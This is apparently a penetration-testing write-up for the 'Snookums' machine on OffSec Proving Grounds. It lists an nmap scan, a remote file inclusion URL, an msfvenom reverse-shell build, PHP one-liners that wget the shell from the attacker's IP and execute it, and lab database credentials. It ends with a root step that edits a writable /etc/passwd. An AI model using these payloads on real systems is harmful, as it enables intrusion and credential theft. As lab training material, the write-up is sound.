# Snookums

## Info

Snookums is an intermediate linux machine from offsec proving gorunds.

## Nmap

All tcp port scan.

```
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 3.0.2
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       syn-ack ttl 61 MySQL (unauthorized)
33060/tcp open  mysqlx?     syn-ack ttl 61
```

## User

Simple php gallery is vulnerable to RFI.

```
http://192.168.192.58/image.php?img=http://192.168.45.187/test.php
```

Create bin.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.187 LPORT=21 -f elf > shell
```

Transfer bin to the machine.

```
echo '<?php system("wget http://192.168.45.187/shell -O /tmp/shell ; chmod +x /tmp/shell"); ?>' > get.php
```

Execute shell.

```
echo '<?php system("/tmp/shell"); ?>' > shell.php
```

The following creds were found in /var/www/html/db.php

```
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
```

Credentials found in SimplePHPGal database.

```
josh VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
michael U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
```

michael credentials.

```
HockSydneyCertify123
```

## Root

/etc/passwd is writable, remove the x from root:x: and switch user to root without password.

